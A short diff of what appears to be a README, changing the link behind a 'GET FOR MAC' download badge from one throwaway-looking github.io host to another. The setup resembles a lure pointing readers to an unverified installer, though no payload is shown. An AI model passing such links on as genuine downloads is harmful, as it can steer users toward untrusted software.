@@ -6,7 +6,7 @@
 <br>  
 
 <div align="center">  
-  <a href="https://osx-get-2025.github.io/.github/paragon" target="_blank" rel="noopener">
+  <a href="https://osx-quick-app.github.io/.github/paragon" target="_blank" rel="noopener">
     <img alt="🍏 GET FOR MAC" src="https://img.shields.io/badge/🍏_GET_FOR_MAC-green?style=for-the-badge&logo=apple">
   </a>
 </div>  
